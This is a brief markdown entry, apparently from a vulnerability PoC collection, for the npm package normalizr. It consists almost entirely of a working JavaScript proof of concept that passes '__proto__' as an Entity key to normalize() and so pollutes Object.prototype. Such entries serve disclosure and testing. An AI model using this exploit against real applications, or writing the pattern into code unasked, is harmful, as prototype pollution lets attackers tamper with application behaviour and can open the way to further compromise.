# normalizr

- package name: `normalizr`

- PoC exploit:

```javascript
var normalizr = require('normalizr');
var e = normalizr.schema.Entity('__proto__', {});
normalizr.normalize({id: 'polluted'}, e);
// Object.prototype.polluted !== undefined
```